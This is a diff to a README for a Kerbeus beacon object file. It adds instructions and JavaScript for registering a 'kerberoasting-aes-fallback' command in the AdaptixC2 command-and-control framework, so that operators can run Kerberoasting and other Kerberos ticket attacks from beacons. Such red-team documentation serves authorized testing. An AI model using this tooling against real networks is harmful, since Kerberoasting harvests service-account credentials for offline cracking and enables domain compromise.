@@ -64,6 +64,33 @@ To include in `make`:
   echo '[+] kerberoasting-aes-fallback' || echo '[!] kerberoasting-aes-fallback'
 ```
 
+## AdaptixC2 / kerbeus.axs Integration
+
+Add the following command block to `kerbeus.axs` after the existing
+`_cmd_kerberoasting` block:
+
+​```javascript
+let _cmd_kerberoasting_aes = ax.create_command("kerberoasting-aes-fallback", "Perform Kerberoasting with AES256→AES128→RC4 etype negotiation", "kerbeus kerberoasting-aes-fallback /spn:CIFS/COMP.domain.local /ticket:doIF8DCCBey...");
+_cmd_kerberoasting_aes.addArgString("params", true, "Args: /spn:SPN /ticket:BASE64 [/dc:DC] [/domain:DOMAIN]\n                              /spn:SPN /nopreauth:USER [/dc:DC] [/domain:DOMAIN]");
+_cmd_kerberoasting_aes.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)  {
+    let params = parsed_json["params"];
+
+    let bof_params = ax.bof_pack("cstr", [params]);
+    let bof_path = ax.script_dir() + "_bin/Kerbeus-BOF/kerberoasting-aes-fallback." + ax.arch(id) + ".o";
+
+    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Kerbeus KERBEROASTING-AES-FALLBACK");
+});
+​```
+
+Then register it in `addSubCommands`:
+
+​```javascript
+cmd_kerbeus.addSubCommands([_cmd_asreproasting, _cmd_asktgt, _cmd_asktgs, _cmd_changepw, _cmd_dump, _cmd_hash, _cmd_kerberoasting, _cmd_kerberoasting_aes, _cmd_klist, _cmd_ptt, _cmd_describe, _cmd_purge, _cmd_renew, _cmd_s4u, _cmd_cross_s4u, _cmd_tgtdeleg, _cmd_triage]);
+​```
+
+Reload the `.axs` file in AdaptixC2 after saving. The command will appear
+as `kerbeus kerberoasting-aes-fallback` in the beacon context menu.
+
 ---
 
 ## Usage
